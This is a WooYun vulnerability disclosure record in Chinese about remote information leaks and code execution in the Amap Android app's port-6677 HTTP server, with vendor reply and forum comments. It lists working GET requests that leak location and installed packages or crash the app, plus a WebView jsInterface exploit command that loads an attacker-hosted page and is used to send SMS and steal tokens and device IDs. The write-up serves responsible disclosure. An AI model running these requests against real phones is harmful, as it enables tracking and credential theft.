{"id": 6590, "wybug_id": "wooyun-2015-0114241", "wybug_title": "高德地图远程获取手机的敏感信息可远程命令执行（可以远程利用非webview）", "wybug_corp": "高德软件", "wybug_author": "小荷才露尖尖角", "wybug_date": "2015-05-15 10:32", "wybug_open_date": "2015-08-13 15:18", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向公众公开  简要描述： null 详细说明：  0x01 概述高德地图是一款装机量极大的地图应用，在各大应用市场的下载量均达到千万级别。但其Android版本（6.5.3-7.2.6）存在一系列远程命令执行漏洞，利用这个漏洞攻击者可以远程获取手机的敏感信息，实现对高德地图的拒绝服务，获取高德地图私有目录下的敏感文件，并远程执行命令。0x02漏洞描述以下分析针对官网正式版，版本号7.2.5.2050。1. 漏洞原理com.amap.api.service.AMapService中，可以看到高德地图app实现了一个小型的HTTP Server，该Server在tcp的6677端口监听，当请求满足一定条件时可以返回敏感信息，并根据请求消息执行一系列动作。见run方法\n\n设置HTTP响应\n\n请求满足的条件包括：（1）Referer为如下网址中的一个\n\n（2）使用HTTP GET请求访问6677端口，并且形式为http://ip:6677/command?param1=value1&...&paramn=valuencommand为getpackageinfo、androidamap、geolocation中的其一\n\n以下分三种情况：（1）当command为geolocation时，可返回安装高德地图的手机用户地理位置信息；（2）当command为getpackageinfo时，默认返回高德地图app本身的版本信息。此时若指定参数param1为packagename,即请求http://ip:6677/getpackageinfo?packagename=xxx时（xxx为软件包名）可返回手机上安装的xxx所指定的任意软件包版本信息。值得注意的是，若xxx为android，可返回android系统版本信息；（3）当command为androidamap时，可以造成远程拒绝服务、甚至可以在高德地图app中远程执行命令，我们着重分析此种情况。此时需要指定参数param1为action,即请求http://ip:6677/androidamap?action=yyy&param2=value2&...&paramn=valuen时，AMapService将设置一intent对象，其action为com.autonavi.minimap.Intent.Action，extra为{“method”:\"androidamap\",\"action\",\"yyy\",\"params\",\"&param2=value2&...&paramn=valuen\"}，然后将其广播出去。搜索com.autonavi.minimap.Intent.Action,可发现AmapActionBroadcastReceiver对其进行处理。见com.autonavi.map.intent.AmapActionBroadcastReceiver中的onReceive方法\n\nOnReceive方法取出前面广播intent对象的extra，新建一个intent对象，设置intent uri为androidamap://yyy?sourceApplication=web&param2=value2&...&paramn=valuen，并以隐式intent的形式启动注册这种uri scheme的activiy.在AnroidManifest文件中可发现，com.autonavi.map.activity.NewMapActivity注册了data secheme为androidamap的Intent Filter，且data host可以为showTraffic、viewMap、indoorMap、myLocation、bus、arroundpoi、route、keywordNavi、viewReGeo、viewPOIDetail、shortUrl、discovery、hotelList、gropbuyList、movieList、groupbuyDetail、navi2SpecialDest、rootmap、openmap、openTrafficRemind、multiPointShow、navi、poi、openFeature。至此，我们得出这样的结论，可以通过远程访问http://ip:6677/androidamap?action=yyy&param2=value2&...&paramn=valuen，启动目标ip中的com.autonavi.map.activity.NewMapActivity执行命令，其中yyy为上述data host中的任一。2. 测试结果对上述三种情况进行测试，归纳测试结果如下HTTP GET请求\t漏洞类型\t漏洞造成的后果http://ip:6677/geolocation?\t敏感信息泄露\t远程获取经纬度http://ip:6677/getpackageinfo?packagename=xxx,其中xxx为软件包名\t敏感信息泄露\t远程获取xxx所指定的任意安装包信息http://ip:6677/androidamap?action=showTraffice\t远程命令执行\t打开实时路况http://ip:6677/androidamap?action=viewMap\t远程拒绝服务\t高德地图app停止运行http://ip:6677/androidamap?action=indoorMap\tNone\tNonehttp://ip:6677/androidamap?action=myLocation\t远程命令执行\t在地图中显示所处的位置http://ip:6677/androidamap?action=viewMap\t远程拒绝服务\t高德地图app停止运行http://ip:6677/androidamap?action=bus\t远程命令执行\t打开公交搜索框http://ip:6677/androidamap?action=arroundpoi\t远程命令执行\t执行搜索http://ip:6677/androidamap?action=route\t远程拒绝服务\t高德地图app停止运行http://ip:6677/androidamap?action=keywordNavi\tNone\tNonehttp://ip:6677/androidamap?action=viewReGeo\tNone\tNonehttp://ip:6677/androidamap?action=viewPOIDetail\tNone\tNonehttp://ip:6677/androidamap?action=shortUrl\tNone\t提示当前版本不支持http://ip:6677/androidamap?action=discovery\tNone\t提示当前版本不支持http://ip:6677/androidamap?action=hotelList\tNone\t提示“当前版本不支持”http://ip:6677/androidamap?action=groupbuyList\tNone\t提示“当前版本不支持”http://ip:6677/androidamap?action=navi2SpecialDest\t远程拒绝服务\t高德地图app停止运行http://ip:6677/androidamap?action=rootmap\tNone\tNonehttp://ip:6677/androidamap?action=openmap\t远程拒绝服务\t高德地图app停止运行http://ip:6677/androidamap?action=openTrafficRemind\tNone\t提示当前版本不支持http://ip:6677/androidamap?action=multiPointShow\tNone\t提示选择地图上的点http://ip:6677/androidamap?action=navi\tNone\t打开在线导航http://ip:6677/androidamap?action=nonexist\t远程拒绝服务\tapp崩溃注意上面最后一行，当action为以不存在的data host时，抛出空指针异常，导致远程拒绝服务，使高德地图app停止运行。另外，有些aciton也导致远程拒绝服务，我们推测主要是action后面缺少param参数，导致没有取到需要的intent extra，抛出空指针异常所致。3. 当action为openFeature严格来说，上面测试中的远程命令执行不算漏洞，因为没有对安全带来影响。下面我们单独讨论当远程HTTP GET请求访问http://ip:6677/androidamap?action=openFeature的情况，这种情况对安全影响最大，是真正的远程命令执行漏洞。在com.autonavi.map.life.movie.view.MovieDetailHeaderView中，有以下代码\nUri v0_2 = Uri.parse(\"androidamap://openFeature?featureName=OpenURL&sourceApplication=banner&urlType=0&contentType=autonavi&url=\"                             + this.a.m.privilegeLink);\tIntent v1 = new Intent(MovieDetailHeaderView.c(this.a).getApplicationContext(),                             NewMapActivity.class);\tv1.setData(v0_2);\tv1.setFlags(268435456);\tMovieDetailHeaderView.c(this.a).startActivity(v1);\n 这表明可以通过远程HTTP GET请求如下地址 \thttp://ip:6677/androidamap?action=openFeature&featureName=OpenURL&sourceApplication=banner&urlType=0&contentType=autonavi&url=evilsite 使安装高德地图app的手机访问攻击者所操纵的链接evilsite，进一步的测试表明，这里存在WebView的漏洞，可以利用实现：1. \t窃取私有目录下的敏感文件：远程攻击者或者本地恶意app可以令WebView加载file://域的恶意脚本文件，按照恶意脚本的请求，窃取高德地图app私有目录下的敏感文件，包括手机IMEI、IMSI、MAC地址，登录token，突破android linux进程的访问控制；2. WebView远程命令执行：存在可被网页中js操纵的接口jsinterface。由于高德地图针对的SDK版本较低（android:minSdkVersion=\"8\"），在Android 4.4.2以下的手机，均可使用该接口，注入高德地图app进程执行命令。   漏洞证明：  0x03 漏洞证明1. 远程获取敏感信息获取地理位置：\n\n2. 远程获取安装的android系统信息与软件包信息：获取android版本信息：\n\n3.远程拒绝服务\n\n效果\n\n4.远程命令执行操纵url访问任意网页：\n\n效果\n\n(1)配合本地恶意脚本，窃取私有目录下的敏感文件位于/sdcard的本地恶意脚本attack.html\n\n远程操纵使其加载该恶意脚本（本地恶意app也可通过127.0.0.1操纵）\n\n成功获得高德地图app私有目录下的敏感文件，包含已登录淘宝账号的token\n\n如法炮制，同样可以窃取手机/data/data/com.autonavi.minimap/shared_prefs/私有目录下的其他文件* Alvin2.xml包含手机IMEI明文；* umeng_message_state.xml包含umeng app key和secret等信息；* CookiePrefsFile.xml包含cookie session id信息；* AppStore.xml包含mac地址、IMSI明文。（2）Webviwe远程命令执行（影响4.4.2以下版本）使用安装高德地图的4.3版android手机测试，发现高德地图app内置webview存在webview漏洞。android版本\n\n检测到webview漏洞，发现jsInterface接口可供利用\n\n在192.168.3.165搭建恶意webserver。 \npython -m SimpleHTTPServer\n由于高德地图具有发送短信的权限，写一个利用jsInterface发送短信的expwebview_exp.html\n\n利用如下命令攻击安装高德地图的目标手机192.168.3.180  \npython GaodeExp.py -c androidamap -p openFeature -u http://192.168.3.165:8000/webview_exp.html 192.168.3.180 6677\n目标手机界面\n\n攻击者手机收到目标机短信，可据此获知受害者的手机号。\n\n由于利用前面的漏洞（getpackageinfo）可以获取手机安装包和系统信息，利用jsInterface接口，还可以通过恶意网页针对性地写入root提权代码或植入木马并执行，造成更大的危害(各种通过Webview植入木马的EXP已经不少了吧，drozer就有现成的payload)。0x04漏洞影响该漏洞不仅可被恶意app本地利用，也可被远程利用。对于远程利用，显而易见，一种受漏洞影响的攻击利用场景是在公共WIFI网络，攻击者可以在公共WIFI网络的内网批量扫描打开高德地图的手机进行攻击。但另外还有一种隐蔽的攻击场景是在3G/4G内网，国内移动分组网GGSN下面挂接的大量用户终端事实上可以互访，因此同样可以进行批量扫描。我们按照如下步骤在联通3G/4G内网进行了测试（1）手机使用3G/4G上网，并打开WIFI热点共享.（2）使用netstat查看移动分组网为手机分配的内网地址。（3）PC使用手机共享的WIFI上网，在该内网地址C段进行扫描存在漏洞的手机，并获取受漏洞影响的高德地图版本信息。我们扫描了两个C段，发现了4个打开高德地图的手机可以进行漏洞利用，并得知漏洞影响版本至少包括6.5.3，7.2.5.2050,7.2.6.1041beta。扫描结果vul.text\n{\"package\":\"com.autonavi.minimap\",\"error_code\":0,\"error\":\"\",\"version_code\":525,\"version\":\"7.2.5.2050\"}{\"package\":\"com.autonavi.minimap\",\"error_code\":0,\"error\":\"\",\"version_code\":525,\"version\":\"7.2.5.2050\"}{\"package\":\"com.autonavi.minimap\",\"error_code\":0,\"error\":\"\",\"version_code\":453,\"version\":\"6.5.3\"}{\"package\":\"com.autonavi.minimap\",\"error_code\":0,\"error\":\"\",\"version_code\":525,\"version\":\"7.2.5.2050\"}{\"package\":\"com.autonavi.minimap\",\"error_code\":0,\"error\":\"\",\"version_code\":525,\"version\":\"7.2.6.1041 Beta\"}\n由于在3G/4G网络下打开高德地图是比较常见的情形，而且相对于公共WIFI，用户感觉更加安全，因此可以更加隐蔽地利用该漏洞发起攻击，带来的危害更大。另外我们注意到该漏洞出现在com.amap.api.service.AMapService中，因此可能影响到使用高德地图API的其他应用，限于时间关系，我们暂未进行测试。   修复方案：  1.在Android系统中，建议采用Binder跨进程通信，而非socket。如果短期内难以更改，建议只在127.0.0.1地址监听，并采用比referer检查更强的认证方式。2.针对androidamap://openFeature?featureName=OpenURL&sourceApplication=banner&urlType=0&contentType=autonavi&url=这种Intent，禁止用户传入url3.更新Android target SDK版本.4.排查使用高德地图API的其他应用   版权声明：转载请注明来源 小荷才露尖尖角@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-05-15 15:16 厂商回复： 该漏洞之前已有白帽子上报到ASRC，业务方正在修复中，感谢支持阿里安全工作。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-15 10:36 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  前排出售瓜子饮料    \n     2015-05-15 10:43 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @毕月乌 来个十斤！    \n     2015-05-15 10:53 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  屌屌的    \n     2015-05-15 10:55 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  很有学习价值    \n     2015-05-15 10:57 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  目测新思路，得学习下    \n     2015-05-15 12:10 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:31        )\t\t \n  大家猜是哪位大神    \n     2015-05-15 12:42 |    \t\t哈兹本德 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:2        | 哎呀，菜鸟一枚。)\t\t \n  路人甲是一个邪恶的组织啊    \n     2015-05-15 14:21 |    \t\t我能拒绝么 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 疯爆志林)\t\t \n  中国“路人甲”组织表示即将对美国政府网站进行攻击    \n     2015-05-15 15:18 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:63        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  1………这个雷白打了    \n     2015-05-15 15:19 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  1    \n     2015-05-15 15:35 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  最近流行1，哈哈哈    \n     2015-05-15 15:36 |    \t\t小荷才露尖尖角 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:13        | less is more)\t\t \n  说明阿里并不重视高德    \n     2015-05-15 15:40 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @小荷才露尖尖角 这个重不重视有毛关系。    \n     2015-05-15 15:47 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  1………这个雷白打了     \n     2015-05-15 15:53 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:45        | 答案)\t\t \n  U最近流行1 哈哈    \n     2015-05-15 15:55 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  这个1,伤碎了多少人的心。    \n     2015-05-15 16:07 |    \t\t小荷才露尖尖角 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:13        | less is more)\t\t \n  1就1吧，感谢乌云打雷，让我找回了价值    \n     2015-05-16 10:17 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  赚了    \n     2015-05-18 21:32 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 南无阿弥陀佛！)\t\t \n  厂商真抠，请得起白富美邀的了高富帅，就是不给乌云币    \n     2015-05-18 22:00 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  @紫霞仙子 十斤瓜子你吃得了么！    \n     2015-05-19 10:01 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  @毕月乌 我又不是一次吃完！    \n     2015-05-19 10:19 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  @紫霞仙子 小心放坏了    \n     2015-05-19 22:35 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  可怜的分数啊。    \n     2015-05-20 23:26 |    \t\tPythonPig \t\t\t( 普通白帽子  |\t\t\t        Rank:491 漏洞数:71        | 只会简单工具的小小菜)\t\t \n  膜拜专家    \n     2015-05-21 13:53 |    \t\t深瞳 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我在看，在学习！)\t\t \n  围观，虽然啥也看不到。    \n     2015-05-22 20:13 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:26        | 他们回来了................)\t\t \n  已围观    \n     2015-07-09 16:51 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  细节太精彩了。。    \n     2015-07-19 16:05 |    \t\t小手冰凉 \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:18        | 幸福你我他)\t\t \n  哥们 辛苦了。。。    \n     2015-07-20 10:02 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:68        )\t\t \n  1分。。    \n     2015-07-20 14:18 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:69        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  想转发到droidsec.cn 可惜还没完全公开呐    \n     2015-08-04 18:57 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  看不懂。。。    \n     2015-08-13 17:58 |    \t\tk0_pwn \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 专注二进制许多年，突然觉得web才好玩)\t\t \n  就喜欢看逆向这块的，可惜我的IDA连ARM的F5都没有！    \n     2015-08-13 19:48 |    \t\tJ0e \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 心若苍井空似水)\t\t \n  1Rank  这个亮了 打字费都不止= =     \n     2015-08-14 12:54 |    \t\tRainism \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | hacking for fun)\t\t \n  好厉害    \n     2015-08-20 17:36 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  不会是发asrc了又复制一份发乌云吧？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}